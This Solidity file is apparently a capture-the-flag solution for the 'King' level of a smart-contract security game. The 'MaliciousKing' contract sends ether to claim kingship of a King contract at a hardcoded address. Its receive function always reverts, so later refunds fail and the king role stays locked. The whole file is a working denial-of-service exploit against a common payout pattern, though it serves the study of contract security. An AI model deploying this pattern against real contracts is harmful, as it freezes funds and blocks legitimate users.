// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './King.sol';

contract MaliciousKing {

    King public king;


    constructor() public payable {
        king = King(0x9cED303B56A965Fa4E7F9bd0d25e549A3Bb4E336);  
    }

    function becomeKing() public payable {
        (bool success, ) = payable(address(king)).call.value(0.002 ether).gas(50000)("");
    }

    receive() external payable {
        revert();
    }
}